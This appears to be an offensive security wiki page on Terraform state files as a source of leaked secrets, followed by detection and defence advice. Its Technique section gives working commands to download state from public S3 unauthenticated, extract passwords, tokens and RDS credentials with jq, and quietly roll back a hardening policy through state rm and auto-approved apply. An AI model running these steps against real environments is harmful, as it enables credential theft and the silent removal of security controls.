---
title: Terraform state extraction
slug: terraform-state-extraction
---

> **TL;DR:** `terraform.tfstate` is a plaintext JSON dump of every resource Terraform manages — including any secret passed as an input or surfaced as an output — and is routinely found on world-readable S3 buckets, in CI artifact stores, and inside Git repos.

## What it is
Terraform persists its view of reality in a state file that lists every managed resource and the values of their attributes. Sensitive inputs (RDS master passwords, API keys, private keys, OAuth client secrets) are written verbatim because Terraform needs them to compute diffs. The file lives wherever the configured backend points: local disk (default), an S3 bucket with optional DynamoDB locking, a GCS bucket, an Azure Storage container, Terraform Cloud, or a self-hosted HTTP backend. Misconfigured S3 backends — public read, broken bucket policy, leaked credentials — are the most common path to a full credential dump for an entire environment.

## Preconditions / where it applies
- A Terraform-managed environment with non-trivial secret inputs (almost every real deployment).
- One of: public/misconfigured remote-state bucket, leaked CI artifact, `.tfstate` checked into Git, developer laptop reachable post-foothold, or a Terraform Cloud token with workspace `read` permission.
- No `encrypt = true` + KMS CMK on the S3 backend, or the attacker already holds the KMS key.

## Technique
```bash
# Find leaked state in public S3 / Git
aws s3 ls s3://corp-terraform-state/ --no-sign-request
aws s3 cp s3://corp-terraform-state/prod/terraform.tfstate - --no-sign-request | jq .

# Extract every secret the state knows about
jq -r '.resources[]
  | .instances[]?.attributes
  | to_entries[]
  | select(.key|test("password|secret|token|key"))
  | "\(.key)=\(.value)"' terraform.tfstate

# Sensitive outputs are usually the juiciest
jq '.outputs | to_entries[] | {key, value: .value.value}' terraform.tfstate
# → db_password, api_keys, kubeconfig, oauth_client_secret, ...

# Pull RDS master credentials and pivot
jq -r '.resources[] | select(.type=="aws_db_instance")
  | .instances[].attributes | "\(.endpoint) \(.username) \(.password)"' terraform.tfstate

# Destructive variant — state-rm to drop a resource from management,
# then re-apply to roll back a hardening change without an audit trail
terraform state rm aws_iam_policy.deny_metadata
terraform apply -auto-approve
```

State files also leak provider tokens (`aws_access_key`, `kubernetes` `client_certificate`), GitHub PATs used by the `github` provider, and Vault tokens used by the `vault` provider — chains that turn one bucket-read into multi-platform compromise.

## Detection and defence
- Remote state on S3: `encrypt = true` with a KMS CMK, bucket policy denying `s3:GetObject` from outside the deploy role, MFA-delete on the bucket, and S3 Public Access Block at the account level.
- Never check `.tfstate` or `.tfstate.backup` into Git; add to `.gitignore` and scan history with `trufflehog`/`gitleaks`.
- Mark sensitive variables with `sensitive = true` so they are masked in plan output and CI logs (they still land in state — encryption is mandatory).
- CloudTrail / Cloud Audit Logs: alert on `GetObject` against the state bucket from principals that are not the CI deploy role.
- Treat the Terraform Cloud workspace token as a root credential and rotate on compromise.

## References
- [HashiCorp — Sensitive data in state](https://developer.hashicorp.com/terraform/language/state/sensitive-data) — official caveat that state is plaintext.
- [HashiCorp — S3 backend](https://developer.hashicorp.com/terraform/language/backend/s3) — `encrypt`, `kms_key_id`, and locking options.

See also: [[aws-s3-attacks]], [[aws-secrets-manager]], [[cloud-iam-misconfig-patterns]], [[ci-cd-as-cloud-attack-surface]], [[aws-assumerole-chains]].
